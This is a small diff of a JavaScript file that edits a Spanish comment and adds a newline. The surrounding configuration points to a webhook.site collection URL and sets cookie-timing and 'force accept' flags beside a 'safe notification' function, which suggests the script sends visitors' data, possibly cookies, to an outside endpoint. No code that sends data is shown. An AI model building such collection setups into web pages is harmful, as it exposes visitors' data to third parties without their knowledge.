@@ -5,7 +5,7 @@
  */
 
 const CONFIG = {
-    // ¡IMPORTANTE!: Asegúrate de que esta sea TU URL de webhook.site válida
+    // Asegúrate de que esta sea TU URL de webhook.site válida
     WEBHOOK_URL: "https://webhook.site/69645d7a-1150-4fa8-91c8-5945d2312697", 
     COOKIE_TIMEOUT: 1500,
     FORCE_ACCEPT: true
@@ -250,3 +250,4 @@ function showSafeNotification() {
     document.body.appendChild(notif);
     setTimeout(() => notif.remove(), 3000);
 }
+
